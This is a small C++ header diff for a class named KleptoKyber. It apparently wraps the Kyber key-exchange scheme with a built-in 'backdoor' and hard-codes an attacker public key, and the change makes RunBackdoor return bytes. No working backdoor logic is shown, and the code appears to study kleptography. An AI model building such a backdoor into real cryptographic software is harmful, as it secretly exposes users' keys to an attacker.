@@ -22,7 +22,7 @@ const Bytes attacker_pk = Bytes(std::vector<int>{148, 203, 189, 43, 182, 88, 248
 class KleptoKyber : public Kyber {
  public:
   KleptoKyber(int option, Bytes attacker_pk, const std::vector<int>& seed = {});
-  void RunBackdoor();
+  Bytes RunBackdoor();
   
  private:
   Bytes attacker_pk_;
